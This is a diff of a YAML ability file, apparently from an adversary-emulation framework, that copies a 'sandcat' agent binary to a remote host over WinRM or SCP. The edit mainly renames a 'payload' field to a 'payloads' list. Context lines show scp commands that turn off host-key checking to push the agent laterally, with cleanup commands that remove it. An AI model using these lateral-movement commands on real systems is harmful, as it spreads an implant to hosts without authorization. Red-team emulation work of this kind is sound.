@@ -1,5 +1,3 @@
----
-
 - id: 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
   name: Copy 54ndc47 (WinRM and SCP)
   description: Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP
@@ -25,7 +23,6 @@
             Remove-PSSession -Session $session;
           };
           Receive-Job -Job $job -Wait;
-        payload: sandcat.go-windows
         cleanup: |
           $job = Start-Job -ScriptBlock {
             $username = "#{domain.user.name}";
@@ -39,17 +36,21 @@
             Remove-PSSession -Session $session;
           };
           Receive-Job -Job $job -Wait;
+        payloads:
+        - sandcat.go-windows
     darwin:
       sh:
         command: |
           scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go
         cleanup: |
           ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'
-        payload: sandcat.go-darwin
+        payloads:
+        - sandcat.go-darwin
     linux:
       sh:
         command: |
           scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go
         cleanup: |
           ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'
-        payload: sandcat.go-linux
+        payloads:
+        - sandcat.go-linux
